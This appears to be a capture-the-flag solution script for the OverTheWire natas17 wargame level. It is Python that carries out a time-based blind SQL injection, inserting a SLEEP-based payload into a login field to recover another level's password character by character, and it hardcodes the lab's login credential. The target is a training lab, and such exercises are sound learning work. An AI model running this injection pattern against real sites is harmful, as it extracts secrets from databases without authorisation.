import requests
import math
import time

alpha = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
url = "http://natas17.natas.labs.overthewire.org/"
passw = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
user = "natas17"
final = ""




startIndex = 0;
enddIndex = len(alpha) - 1;

for i in range(0, 32):
    cur = 0
    done = False
    while not done:
        payload = 'natas18" AND IF(ascii(substring(password,' +  str(i+1) + ',1)) = ascii("' + str(alpha[cur])+ '"), SLEEP(10), 0) #'
        start = time.time()
        r = requests.post(url + "index.php", data = {'username':payload}, auth=(user, passw))
        end = time.time()
        print("testing character " + str(alpha[cur]))
        if (end-start > 9):
            final = final + alpha[cur]
            print(final)
            done = True
        else: 
            cur+=1
        
